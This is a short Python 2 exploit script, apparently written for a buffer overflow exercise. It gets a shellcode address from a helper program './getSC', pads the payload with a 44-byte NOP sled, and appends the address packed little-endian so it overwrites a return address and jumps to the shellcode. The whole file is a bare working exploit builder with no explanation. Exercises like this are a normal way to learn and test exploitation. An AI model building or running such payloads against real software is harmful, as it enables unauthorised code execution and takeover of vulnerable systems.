import os
from struct import *

p = lambda x : pack("<L", x)

f = os.popen("./getSC", "r")

SC_Address = f.read()
NSled = "\x90"*44

payload = ""
payload += NSled
payload += p(long(SC_Address, base = 16))

print payload